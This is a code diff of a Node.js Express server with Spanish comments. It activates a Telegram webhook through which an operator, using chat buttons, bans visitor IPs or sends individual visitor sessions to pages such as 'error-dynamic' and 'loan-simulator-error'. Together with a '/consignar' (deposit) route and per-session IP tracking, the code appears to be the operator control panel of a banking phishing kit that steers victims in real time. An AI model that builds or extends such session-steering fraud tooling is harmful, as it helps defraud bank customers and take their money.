@@ -354,69 +354,50 @@ app.post('/consignar', async (req, res) => {
 });
 
 // ==================== WEBHOOK DE TELEGRAM ====================
-/*
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
-  // ✅ Responder inmediato a Telegram
   res.sendStatus(200);
 
-  // ✅ Log completo del update
-  console.log("📩 TELEGRAM UPDATE:", JSON.stringify(req.body));
+  const update = req.body;
+  if (!update.callback_query) return;
 
-  try {
-    const update = req.body;
-    const { callback_query } = update;
+  const callback = update.callback_query;
+  const [action, sessionId] = (callback.data || '').split('|');
 
-    if (!callback_query) return;
+  console.log("📞 Acción:", action, "Session:", sessionId);
 
-    const [action, sessionId] = (callback_query.data || '').split('|');
+  // RESPONDER AL BOTÓN (OBLIGATORIO)
+  await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
+    callback_query_id: callback.id,
+    text: '✅ Acción recibida',
+    show_alert: false
+  });
 
-    console.log("📞 Callback recibido");
-    console.log("➡ Acción:", action);
-    console.log("➡ Session:", sessionId);
+  // ===== MANEJO DE ACCIONES =====
 
-    // ==================== RESPONDER AL BOTÓN (OBLIGATORIO) ====================
-    await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
-      callback_query_id: callback_query.id,
-      text: '✅ Acción recibida (demo)',
-      show_alert: false
-    });
-
-    // ==================== MANEJO DE ACCIONES (DEMO) ====================
-    if (action === 'approve') {
-      console.log(`✅ Acción APROBAR para ${sessionId}`);
+  if (action === 'ban') {
+    const session = sessionData.get(sessionId);
+    if (session?.ip) {
+      bannedIPs.add(session.ip);
+      redirections.set(sessionId, 'banned');
     }
+    return;
+  }
 
-    if (action === 'reject') {
-      console.log(`❌ Acción RECHAZAR para ${sessionId}`);
-    }
+  if (action === 'error-dynamic') {
+    redirections.set(sessionId, 'error-dynamic');
+    return;
+  }
 
-    // ==================== QUITAR BOTONES (OPCIONAL) ====================
-    try {
-      await axios.post(getTelegramApiUrl('editMessageReplyMarkup'), {
-        chat_id: callback_query.message.chat.id,
-        message_id: callback_query.message.message_id,
-        reply_markup: { inline_keyboard: [] }
-      });
-    } catch (e) {
-      console.log("⚠️ No se pudo quitar el menú");
-    }
+  if (action === 'go:loan-simulator-error') {
+    redirections.set(sessionId, 'loan-simulator-error');
+    return;
+  }
 
-  } catch (error) {
-    console.error("❌ Error en webhook:", error.message);
+  if (action.startsWith('go:')) {
+    const route = action.replace('go:', '');
+    redirections.set(sessionId, route);
   }
 });
-*/    
-
-app.post(`/webhook-test`, async (req, res) => {
-  res.sendStatus(200);
-  console.log("WEBHOOK TEST OK");
-  await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
-    callback_query_id: "test",
-    text: "ok"
-  });
-});
-
-
 
 
 
